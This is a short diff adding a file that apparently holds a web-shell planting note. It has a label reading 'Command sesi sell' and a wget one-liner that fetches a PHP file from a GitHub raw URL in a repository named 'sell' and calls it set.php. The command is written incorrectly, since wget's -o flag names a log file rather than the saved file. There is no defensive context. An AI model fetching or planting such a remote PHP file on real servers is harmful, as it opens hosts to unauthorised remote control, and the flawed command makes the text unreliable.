@@ -1,0 +1,4 @@
+
+Command sesi sell
+
+wget raw.githubusercontent.com/NvrSrNdr123/sell/main/aw.php -o set.php
